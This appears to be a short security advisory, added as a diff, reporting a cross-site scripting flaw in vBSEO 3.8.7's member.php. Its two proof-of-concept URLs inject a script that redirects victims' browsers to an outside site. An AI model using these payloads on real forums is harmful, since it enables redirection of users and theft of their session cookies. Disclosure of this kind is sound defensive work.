@@ -1,0 +1,11 @@
+source: http://www.securityfocus.com/bid/55908/info
+
+vBSEO is prone to a cross-site scripting vulnerability because it fails to sanitize user-supplied input.
+
+An attacker may leverage this issue to execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site. This may allow the attacker to steal cookie-based authentication credentials and launch other attacks.
+
+vBSEO 3.8.7 is vulnerable; other versions may also be affected. 
+
+http://www.example.com/forums/member.php?tab=friends&u=11411%22%3E%3Cscript%3Ewindow.location%20=%20%22http://www.internot.info/forum/%22%20%3C/script%3E
+
+http://www.example.com/forum/member.php?u=1%22%3E%3Cscript%3Ewindow.location%20=%20%22http://www.internot.info/forum/%22%20%3C/script%3E 
